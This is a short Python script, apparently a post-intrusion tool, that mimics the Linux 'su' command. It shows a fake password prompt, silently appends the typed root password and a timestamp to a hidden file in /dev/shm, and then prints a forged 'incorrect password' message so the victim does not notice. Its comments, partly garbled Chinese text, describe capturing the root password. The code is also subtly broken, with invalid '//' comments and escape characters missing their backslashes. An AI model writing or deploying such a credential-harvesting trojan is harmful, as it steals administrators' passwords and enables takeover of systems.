#!/usr/bin/python
import os, sys, getpass, time
 
current_time = time.strftime("%Y-%m-%d %H:%M")
logfile="/dev/shm/.su.log"              //�����ȡ���¼������
#CentOS                 
#fail_str = "su: incorrect password"
#Ubuntu              
#fail_str = "su: Authentication failure"
#For Linux Korea                    //centos,ubuntu,korea �л�root�û�ʧ����ʾ��һ��
fail_str = "su: incorrect password"
try:
    passwd = getpass.getpass(prompt='Password: ');
    file=open(logfile,'a')
    file.write("[%s]t%s"%(passwd, current_time))   //��ȡroot����
    file.write('n')
    file.close()
except:
    pass
time.sleep(1)
print fail_str                               //��ӡ�л�rootʧ����ʾ